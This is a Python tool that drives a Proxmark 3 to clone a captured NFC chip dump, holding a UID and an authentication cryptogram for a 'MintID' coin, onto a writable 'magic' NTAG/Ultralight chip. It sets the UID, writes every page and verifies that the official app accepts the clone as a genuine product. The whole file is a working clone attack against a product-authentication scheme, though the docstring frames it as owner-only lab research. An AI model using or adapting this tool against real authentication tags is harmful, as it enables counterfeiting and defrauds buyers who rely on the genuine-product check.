#!/usr/bin/env python3
"""
mintid_pm3_clone.py — clone a captured chip onto a magic NTAG / Ultralight
using Proxmark 3.

Reads the chip dump for a target UID from the oracle DB, generates the
binary dump, then invokes Proxmark 3 commands to:
  1. Detect the magic chip currently on the PM3 antenna
  2. Set its UID to the target UID
  3. Write the dump page-by-page
  4. Verify by reading back

Requires:
  * Proxmark 3 installed (brew install --HEAD proxmark3, see HANDOFF.md)
  * PM3 plugged in and visible at /dev/tty.usbmodem*
  * A magic NTAG 213 / NTAG 215 / Ultralight-C UID Modifiable on PM3 antenna
  * The target chip's dump already in the oracle DB (mintid_oracle.db)

USAGE

    # Detect PM3 only, no writing:
    python3 mintid_pm3_clone.py detect

    # Read whatever's on the PM3 antenna right now:
    python3 mintid_pm3_clone.py read

    # Write a captured dump onto the magic chip on the antenna:
    python3 mintid_pm3_clone.py write 04C3434A9E7384
    python3 mintid_pm3_clone.py write 04C3434A9E7384 --variant gen3
    python3 mintid_pm3_clone.py write 04C3434A9E7384 --dry-run

    # Verify by reading back and comparing to the oracle dump:
    python3 mintid_pm3_clone.py verify 04C3434A9E7384

SAFETY
  This tool writes data to a writable chip. The data being written is the
  captured (UID, NDEF cryptogram) tuple of a coin you own. Use only on
  magic chips you own, in a research lab setting, for the purpose of
  validating the architectural findings already established by the rest
  of this toolkit. Do not attempt to use cloned chips in any context where
  they could be confused for genuine product (commerce, resale, etc).
"""
import argparse
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


# ---------------------------------------------------------------------------
# PM3 binary detection
# ---------------------------------------------------------------------------

def find_pm3_binary():
    """Locate the Proxmark 3 client binary on the system."""
    for candidate in ("pm3", "proxmark3"):
        path = shutil.which(candidate)
        if path:
            return path
    # Common Homebrew install paths if PATH isn't set up
    for fallback in (
        "/opt/homebrew/bin/pm3",
        "/usr/local/bin/pm3",
        "/opt/homebrew/bin/proxmark3",
        "/usr/local/bin/proxmark3",
    ):
        if os.path.exists(fallback):
            return fallback
    return None


def find_pm3_device():
    """Find the USB tty device for the connected PM3."""
    candidates = []
    for entry in Path("/dev").iterdir():
        name = entry.name
        if name.startswith("tty.usbmodem") or name.startswith("ttyACM"):
            candidates.append(str(entry))
    return candidates


def run_pm3_command(commands, pm3_binary=None, port=None, timeout=60,
                    verbose=False):
    """
    Run one or more PM3 commands and return (stdout, stderr, returncode).
    Multiple commands can be chained via semicolons in the PM3 client.
    """
    if pm3_binary is None:
        pm3_binary = find_pm3_binary()
        if pm3_binary is None:
            raise RuntimeError(
                "Could not find Proxmark 3 client. Install with: "
                "brew tap RfidResearchGroup/proxmark3 && "
                "brew install --HEAD proxmark3"
            )

    cmd_string = "; ".join(commands) if isinstance(commands, list) else commands
    args = [pm3_binary, "-c", cmd_string]
    if port:
        args.extend(["-p", port])

    if verbose:
        print("[pm3] $ %s" % " ".join(args))

    # Suppress the Qt GUI window flicker. PM3 client is built with QT GUI
    # support and opens a window even for non-graph commands. Setting
    # QT_QPA_PLATFORM=offscreen makes Qt run headless. Also unset DISPLAY
    # so any X11 fallback doesn't try to draw either.
    env = os.environ.copy()
    env["QT_QPA_PLATFORM"] = "offscreen"
    env.pop("DISPLAY", None)

    # capture_output=True + text=True normally decodes stdout/stderr as
    # UTF-8 strict. PM3's client emits the occasional non-UTF-8 byte
    # (status decorations, transient BCC warnings, etc.) that crashes
    # the decode. Capture as bytes and decode with errors='replace'.
    proc = subprocess.run(
        args,
        capture_output=True,
        text=False,
        timeout=timeout,
        env=env,
    )
    stdout = proc.stdout.decode("utf-8", errors="replace") if proc.stdout else ""
    stderr = proc.stderr.decode("utf-8", errors="replace") if proc.stderr else ""
    return stdout, stderr, proc.returncode


def poll_for_tag(pm3_binary=None, port=None, max_attempts=60,
                  delay_seconds=0.5, verbose=False):
    """
    Poll `hf 14a info` repeatedly until a tag responds with a UID, or we
    give up after max_attempts. Returns the parsed info dict from the
    successful read, or None on timeout.

    Default 60 attempts at 0.5s = 30 seconds of polling.
    """
    if pm3_binary is None:
        pm3_binary = find_pm3_binary()
    if pm3_binary is None:
        print("[poll] PM3 binary not found. Install with:")
        print("       brew tap RfidResearchGroup/proxmark3")
        print("       brew install --HEAD proxmark3")
        return None
    print("[poll] Waiting for tag on HF antenna (up to %.0fs)..." % (
        max_attempts * delay_seconds
    ))
    last_output = ""
    for attempt in range(max_attempts):
        try:
            stdout, _, rc = run_pm3_command(
                "hf 14a info", pm3_binary=pm3_binary, port=port,
                timeout=20, verbose=False,
            )
        except subprocess.TimeoutExpired:
            continue
        except KeyboardInterrupt:
            print("[poll] Interrupted by user.")
            return None
        last_output = stdout
        info = parse_hf_14a_info(stdout)
        if info["uid_hex"]:
            print("[poll] Tag detected: %s" % info["uid_hex"])
            info["raw_output"] = stdout
            return info
        time.sleep(delay_seconds)
        if verbose and attempt % 10 == 9:
            print("[poll] still waiting... (%d/%d)" % (attempt+1, max_attempts))
    print("[poll] Timed out without detecting a tag.")
    if last_output:
        print("[poll] Last PM3 output (tail):")
        for line in last_output.splitlines()[-10:]:
            print("       " + line)
    return None


# ---------------------------------------------------------------------------
# Output parsing
# ---------------------------------------------------------------------------

UID_LINE_RE = re.compile(r"\[\+\]\s*UID:\s*([0-9A-Fa-f ]+)")
ATQA_LINE_RE = re.compile(r"\[\+\]\s*ATQA:\s*([0-9A-Fa-f ]+)")
SAK_LINE_RE = re.compile(r"\[\+\]\s*SAK:\s*([0-9A-Fa-f]+)")
MAGIC_LINE_RE = re.compile(r"\[\+\]\s*Magic capabilit(?:y|ies)\s*:?\s*(.+)")


def parse_hf_14a_info(stdout):
    """Extract UID, ATQA, SAK, magic-capability from `hf 14a info` output."""
    result = {
        "uid_hex": None,
        "atqa_hex": None,
        "sak_hex": None,
        "magic_capabilities": None,
        "raw_output": stdout,
    }
    for line in stdout.splitlines():
        m = UID_LINE_RE.search(line)
        if m and not result["uid_hex"]:
            result["uid_hex"] = m.group(1).replace(" ", "").upper()
        m = ATQA_LINE_RE.search(line)
        if m and not result["atqa_hex"]:
            result["atqa_hex"] = m.group(1).replace(" ", "").upper()
        m = SAK_LINE_RE.search(line)
        if m and not result["sak_hex"]:
            result["sak_hex"] = m.group(1).upper()
        m = MAGIC_LINE_RE.search(line)
        if m and not result["magic_capabilities"]:
            result["magic_capabilities"] = m.group(1).strip()
    return result


def page_bytes_from_oracle(uid, db_path):
    """Fetch the full chip dump for a UID from the oracle DB."""
    from mintid_oracle import Oracle
    oracle = Oracle(db_path)
    cur = oracle.connection.cursor()
    cur.execute(
        "SELECT chip_pages_bytes FROM scans WHERE chip_uid = ? "
        "AND chip_pages_bytes IS NOT NULL ORDER BY scan_id DESC LIMIT 1",
        (uid.upper(),)
    )
    row = cur.fetchone()
    oracle.close()
    if row is None:
        return None
    return bytes(row[0])


# ---------------------------------------------------------------------------
# Subcommands
# ---------------------------------------------------------------------------

def cmd_detect(args):
    """Detect Proxmark 3 hardware without communicating with a chip."""
    print("=== Proxmark 3 detection ===")
    print("")

    pm3_binary = find_pm3_binary()
    if pm3_binary is None:
        print("[fail] PM3 client binary NOT FOUND.")
        print("")
        print("Install with:")
        print("  brew tap RfidResearchGroup/proxmark3")
        print("  brew install --HEAD proxmark3")
        print("")
        print("On Apple Silicon Macs you may need:")
        print("  arch -arm64 brew install --HEAD proxmark3")
        return 1
    print("[ok] PM3 client found at %s" % pm3_binary)

    devices = find_pm3_device()
    if not devices:
        print("[fail] No USB tty device found at /dev/tty.usbmodem*")
        print("")
        print("Plug in the PM3 and try again. If it's plugged in but not")
        print("appearing, check:")
        print("  * USB cable is data-capable (not charge-only)")
        print("  * Try a different USB port")
        print("  * On macOS, you may need to allow the device in Privacy & Security")
        return 1
    print("[ok] Found %d USB device(s):" % len(devices))
    for d in devices:
        print("       %s" % d)

    print("")
    print("Querying PM3 firmware (may take ~10 seconds)...")
    try:
        stdout, stderr, rc = run_pm3_command(
            "hw version", pm3_binary=pm3_binary, timeout=30,
            verbose=args.verbose,
        )
    except subprocess.TimeoutExpired:
        print("[fail] PM3 hung on `hw version`. Likely firmware/client mismatch.")
        print("       Try: pm3-flash-all to update firmware to match client.")
        return 1
    if rc != 0:
        combined = (stdout or "") + (stderr or "")
        print("[fail] PM3 client exited with code %d" % rc)
        if stderr:
            print("       stderr: " + stderr.strip())

        if "cannot communicate" in combined.lower():
            print("")
            print("This error almost always means firmware version mismatch")
            print("between the client (just installed by brew) and the")
            print("firmware on the physical PM3 device.")
            print("")
            print("Diagnostic steps (try in order, stop at first success):")
            print("")
            print("  1. Unplug, wait 5 seconds, replug normally:")
            print("       pm3 -c 'hw version'")
            print("")
            print("  2. Enter bootloader mode and retry:")
            print("       a. Unplug the PM3.")
            print("       b. Press and hold the button on the device.")
            print("       c. Plug it back in while still holding the button.")
            print("       d. Release the button. Two LEDs should stay solid.")
            print("       e. Run: pm3 -c 'hw version'")
            print("")
            print("  3. If bootloader mode works but normal mode doesn't,")
            print("     re-enter bootloader mode then flash to match client:")
            print("       pm3-flash-all")
            print("       (takes ~30 sec, then unplug/replug normally)")
            print("")
            print("  4. If even bootloader fails, suspect USB cable")
            print("     (must be data-capable, not charge-only) or port.")
        elif "permission denied" in combined.lower():
            print("")
            print("Permission denied on the USB port. macOS sometimes blocks")
            print("first-time USB-CDC devices in Privacy & Security.")
            print("Open System Settings -> Privacy & Security and approve")
            print("the device, then re-run.")
        elif "no proxmark" in combined.lower() or "device not found" in combined.lower():
            print("")
            print("PM3 not detected on USB. Check:")
            print("  * Cable is data-capable (not charge-only)")
            print("  * USB port works (try another)")
            print("  * Device LEDs light up when plugged in")
        return 1

    print("[ok] PM3 responded to `hw version`. Excerpt:")
    for line in stdout.splitlines():
        if any(k in line for k in ["version", "firmware", "client",
                                     "bootrom", "Communicating"]):
            print("       " + line.strip())
    return 0


def cmd_read(args):
    """Read whatever chip is currently on the PM3 antenna. Polls until
    a tag is detected or the timeout expires."""
    print("=== PM3 chip read ===")
    print("")

    info = poll_for_tag(
        max_attempts=args.poll_attempts,
        delay_seconds=args.poll_delay,
        verbose=args.verbose,
    )
    if info is None:
        return 1

    print("")
    print("UID         : %s (%d bytes)" % (
        info["uid_hex"], len(info["uid_hex"]) // 2,
    ))
    print("ATQA        : %s" % (info["atqa_hex"] or "?"))
    print("SAK         : %s" % (info["sak_hex"] or "?"))
    print("Magic       : %s" % (info["magic_capabilities"] or "(not detected)"))

    print("")
    print("Full PM3 hf 14a info output:")
    print("---")
    for line in info["raw_output"].splitlines():
        print(line)
    return 0


def cmd_write(args):
    """Write a captured chip dump from the oracle onto the magic chip on PM3 antenna."""
    print("=== PM3 chip write (clone) ===")
    print("")
    target_uid = args.uid.upper()
    print("Target UID  : %s" % target_uid)
    print("Source DB   : %s" % args.db)
    print("Variant     : %s" % args.variant)
    print("")

    pages = page_bytes_from_oracle(target_uid, args.db)
    if pages is None:
        print("[fail] No dump in DB for UID %s" % target_uid)
        return 1
    print("[ok] Loaded %d bytes (%d pages) from oracle for %s" % (
        len(pages), len(pages) // 4, target_uid,
    ))

    # Sanity check: magic Ultralight-C / NTAG 213 chips support 7-byte UIDs
    uid_bytes = bytes.fromhex(target_uid)
    if len(uid_bytes) != 7:
        print("")
        print("[FAIL] Target UID is %d bytes long. Magic Ultralight-C and"
              % len(uid_bytes))
        print("       magic NTAG 213 chips only support 7-byte UIDs.")
        print("")
        print("       The 8-byte UID clone (UID starts with AD) cannot be")
        print("       cloned onto a magic UL-C. Use a 7-byte UID coin")
        print("       (one starting with 04, like the genuine NXP coins")
        print("       04C3434A9E7384 or 04C83E12087484) instead, OR use")
        print("       the Chameleon Mini / Proxmark 3 emulation mode for")
        print("       8-byte UIDs.")
        return 1
    if uid_bytes[0] != 0x04:
        print("")
        print("[warn] Target UID's first byte is 0x%02X, not 0x04 (NXP)."
              % uid_bytes[0])
        print("       Magic chips claiming to be NTAG/UL-C should still")
        print("       accept this, but readers may flag it as suspicious.")
        print("")

    bin_path = "/tmp/mintid_clone_%s.bin" % target_uid
    with open(bin_path, "wb") as f:
        f.write(pages)
    print("[ok] Wrote dump to %s for reference" % bin_path)

    print("")
    print("Place magic NTAG 213 / Ultralight-C UID Modifiable on PM3 antenna...")

    print("")
    print("[1/5] Polling for magic chip...")
    info = poll_for_tag(
        max_attempts=args.poll_attempts,
        delay_seconds=args.poll_delay,
        verbose=args.verbose,
    )
    if info is None:
        print("[fail] No tag detected on antenna within poll window.")
        return 1
    print("       Current UID on antenna: %s" % info["uid_hex"])
    print("       Magic capabilities    : %s" % (
        info["magic_capabilities"] or "(none detected -- may not be writable)"
    ))

    skip_blocks = [0, 1]
    if not args.lock:
        skip_blocks.append(2)
        print("[note] Skipping pages 0/1 (UID via setuid), 2 (lock bytes).")
        print("       Pass --lock to write FF FF locks faithfully.")

    if args.dry_run:
        print("")
        print("[dry-run] Would now run these PM3 commands:")
        cmds = build_write_commands(target_uid, pages, args.variant,
                                     skip_blocks=skip_blocks)
        for c in cmds:
            print("  " + c)
        return 0

    # Build the actual write sequence based on variant
    print("")
    print("[2/5] Setting target UID via %s command set..." % args.variant)
    cmds = build_write_commands(target_uid, pages, args.variant,
                                 skip_blocks=skip_blocks)
    cmd_string = "; ".join(cmds)
    stdout, stderr, rc = run_pm3_command(
        cmd_string, timeout=120, verbose=args.verbose,
    )
    print(stdout[-2000:])  # last 2000 chars of output
    if rc != 0:
        print("[warn] PM3 returned non-zero exit code %d" % rc)
        print("       Output may still indicate success; check above.")

    # Verify
    print("")
    print("[5/5] Verifying by reading the chip back...")
    time.sleep(1)
    info_after = poll_for_tag(
        max_attempts=10, delay_seconds=0.5, verbose=False,
    ) or {"uid_hex": None}
    if info_after["uid_hex"] == target_uid:
        print("[ok] UID matches target: %s" % target_uid)
        print("")
        print("Clone written. To verify the cryptogram is correctly stored,")
        print("now tap the chip with the official MintID app -- expected")
        print("outcome is GenuineProductDetail screen.")
        print("")
        print("Or use the toolkit's PC/SC reader path:")
        print("  python3 mintid_simulate.py --skip-deeper-probes --no-oracle")
        return 0
    else:
        print("[fail] UID after write is %s, expected %s" % (
            info_after["uid_hex"], target_uid,
        ))
        return 1


def build_write_commands(target_uid, page_bytes, variant, skip_blocks=None):
    """Compose PM3 commands for the requested magic-chip variant.

    Uses individual `hf mfu wrbl` calls per page rather than `hf mfu
    restore` because the latter's flag for skipping blocks is
    inconsistent across PM3 client versions. Per-block writes work
    everywhere.

    skip_blocks: pages to skip. Defaults to [0, 2] to skip the UID page
        (set separately via setuid) and the lock bytes page (so the
        cloned chip stays rewritable).
    """
    if skip_blocks is None:
        skip_blocks = [0, 1, 2]

    cmds = []
    # First, set the UID via the magic command for whichever variant
    if variant == "gen1a":
        cmds.append("hf 14a config --atqa force --bcc ignore --cl2 force "
                    "--cl3 skip --rats skip")
    cmds.append("hf mfu setuid --uid %s" % target_uid)

    # Then write each page individually, skipping the configured pages
    page_count = len(page_bytes) // 4
    for page_idx in range(1, page_count):
        if page_idx in skip_blocks:
            continue
        page_data = page_bytes[page_idx*4:(page_idx+1)*4]
        if len(page_data) != 4:
            continue
        # Skip writing all-zero pages above the NDEF terminator (faster, 
        # and these pages are already zero on a fresh magic chip)
        if page_idx >= 16 and page_data == b"\x00\x00\x00\x00":
            continue
        cmds.append("hf mfu wrbl -b %d -d %s" % (
            page_idx, page_data.hex().upper(),
        ))

    if variant == "gen1a":
        cmds.append("hf 14a config --std")

    return cmds


def cmd_verify(args):
    """Read the chip on PM3 antenna and compare to the oracle dump for a UID."""
    target_uid = args.uid.upper()
    expected = page_bytes_from_oracle(target_uid, args.db)
    if expected is None:
        print("[fail] No dump in DB for UID %s" % target_uid)
        return 1

    print("Reading chip on PM3 antenna and comparing to oracle dump...")
    bin_out = "/tmp/mintid_verify_%s.bin" % target_uid
    if os.path.exists(bin_out):
        os.remove(bin_out)
    stdout, _, rc = run_pm3_command(
        "hf mfu dump -f %s" % bin_out, timeout=60, verbose=args.verbose,
    )
    if not os.path.exists(bin_out):
        print("[fail] PM3 did not write a dump file. Output:")
        print(stdout[-1000:])
        return 1
    actual = open(bin_out, "rb").read()

    if actual[:len(expected)] == expected:
        print("[ok] First %d bytes match exactly." % len(expected))
        if len(actual) > len(expected):
            print("     PM3 read %d additional bytes (chip larger than "
                  "dump source); extra bytes not compared." %
                  (len(actual) - len(expected)))
        return 0
    else:
        diff_count = sum(
            1 for a, b in zip(actual[:len(expected)], expected) if a != b
        )
        print("[fail] %d bytes differ between PM3 read and oracle dump." % diff_count)
        return 1


def main():
    p = argparse.ArgumentParser(
        description="Clone captured chip dumps onto magic chips via Proxmark 3."
    )
    p.add_argument("--db", default="mintid_oracle.db",
                   help="Oracle database path (default: mintid_oracle.db)")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="Print PM3 command lines.")
    p.add_argument("--no-prompt", action="store_true",
                   help="(deprecated) kept for backward compatibility.")
    sub = p.add_subparsers(dest="cmd", required=True)

    p_detect = sub.add_parser("detect", help="Detect PM3 hardware.")
    p_detect.set_defaults(func=cmd_detect)

    p_read = sub.add_parser("read", help="Read whatever's on the PM3 antenna.")
    p_read.add_argument("--poll-attempts", type=int, default=60,
                        help="Max polls before timeout (default: 60).")
    p_read.add_argument("--poll-delay", type=float, default=0.5,
                        help="Seconds between polls (default: 0.5).")
    p_read.set_defaults(func=cmd_read)

    p_write = sub.add_parser(
        "write", help="Write a captured dump onto magic chip on antenna."
    )
    p_write.add_argument("uid", help="Target UID (uppercase hex).")
    p_write.add_argument(
        "--variant", default="auto",
        choices=["auto", "gen3", "gen1a", "directwrite", "ultralight"],
        help="Magic chip generation. 'auto' tries direct write.",
    )
    p_write.add_argument("--dry-run", action="store_true",
                         help="Print PM3 commands without executing.")
    p_write.add_argument("--lock", action="store_true",
                         help="Write the source dump's lock bytes faithfully "
                              "(default: skip page 2 so the clone stays "
                              "rewritable). FF FF locks are IRREVERSIBLE on "
                              "non-magic chips and may be sticky on magic "
                              "ones too. Only use --lock for the final demo.")
    p_write.add_argument("--poll-attempts", type=int, default=60,
                         help="Max polls before timeout (default: 60).")
    p_write.add_argument("--poll-delay", type=float, default=0.5,
                         help="Seconds between polls (default: 0.5).")
    p_write.set_defaults(func=cmd_write)

    p_verify = sub.add_parser(
        "verify", help="Compare PM3-read chip vs oracle dump."
    )
    p_verify.add_argument("uid", help="Target UID to compare against.")
    p_verify.add_argument("--poll-attempts", type=int, default=60,
                          help="Max polls before timeout (default: 60).")
    p_verify.add_argument("--poll-delay", type=float, default=0.5,
                          help="Seconds between polls (default: 0.5).")
    p_verify.set_defaults(func=cmd_verify)

    args = p.parse_args()
    rc = args.func(args)
    sys.exit(rc if isinstance(rc, int) else 0)


if __name__ == "__main__":
    main()
